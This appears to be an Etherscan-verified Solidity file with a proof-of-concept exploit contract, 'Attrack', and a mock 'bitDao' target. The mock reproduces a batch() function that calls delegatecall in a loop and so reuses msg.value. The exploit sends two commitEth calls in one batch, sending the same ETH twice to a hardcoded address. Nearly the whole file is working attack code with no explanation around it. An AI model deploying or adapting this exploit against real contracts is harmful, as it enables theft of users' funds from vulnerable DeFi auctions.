/**
 *Submitted for verification at Etherscan.io on 2021-09-15
*/

pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

contract Attrack {
    uint256 public total = 0;
    event result(bool succ);

    function GetcommitEth() public view returns (bytes memory) {
        bytes memory encodedata = abi.encodeWithSignature(
            "commitEth(address,bool)",
            address(0x3e8e59A6A9644AE8b5F1b9d6e2C4dda1ec4643D6),
            true
        );
        return encodedata;
    }

    function attrackBatch(address bitdao) public payable {
        bytes[] memory commitEth = new bytes[](2);
        commitEth[0] = GetcommitEth();
        commitEth[1] = GetcommitEth();
        bytes memory encodedata = abi.encodeWithSignature(
            "batch(bytes[],bool)",
            commitEth,
            false
        );
        bitdao.call{value: 100000 gwei}(encodedata);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getBalance2() public view returns (uint256) {
        return address(0x1b6fE0d3B09E14081b7023141d5d32c180f82b97).balance;
    }

    function commitEth() public payable {}

    fallback() external payable {}
}

contract bitDao {
    uint256 public total = 0;
    event value(uint256 v);

    function add(uint256 num) public {
        total = total + num;
    }

    function commitEth(
        address payable _beneficiary,
        bool readAndAgreedToMarketParticipationAgreement
    ) public payable {
        _beneficiary.transfer(msg.value);
        emit value(msg.value);
    }

    function _getRevertMsg(bytes memory _returnData)
        internal
        pure
        returns (string memory)
    {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return "Transaction reverted silently";

        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    function batch(bytes[] calldata calls, bool revertOnFail)
        external
        payable
        returns (bool[] memory successes, bytes[] memory results)
    {
        successes = new bool[](calls.length);
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(
                calls[i]
            );

            require(success || !revertOnFail, _getRevertMsg(result));
            successes[i] = success;
            results[i] = result;
        }
    }

    function getToken() public view returns (uint256) {
        return address(this).balance;
    }

    function addeth() public payable {}
}